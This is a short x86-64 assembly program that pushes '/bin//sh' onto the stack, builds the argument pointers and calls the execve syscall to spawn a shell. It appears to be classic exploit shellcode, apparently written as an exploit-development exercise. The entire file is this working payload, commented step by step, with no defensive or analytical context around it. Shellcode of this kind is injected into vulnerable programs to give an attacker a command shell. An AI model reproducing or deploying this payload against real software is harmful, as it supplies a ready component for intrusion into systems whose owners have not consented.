global _start 

section .text

_start:

	; First NULL push

	xor rax, rax
	push rax

	; push /bin//sh in reverse 

	mov rbx, 0x68732f2f6e69622f
	push rbx

	; store /bin//sh address in RDI

	mov rdi, rsp

	; Second NULL push 
	push rax

	; set RDX
	mov rdx, rsp 


	; Push address of /bin//sh
	push rdi

	; set RSI

	mov rsi, rsp

	; Call the Execve syscall 
	add rax, 59
	syscall

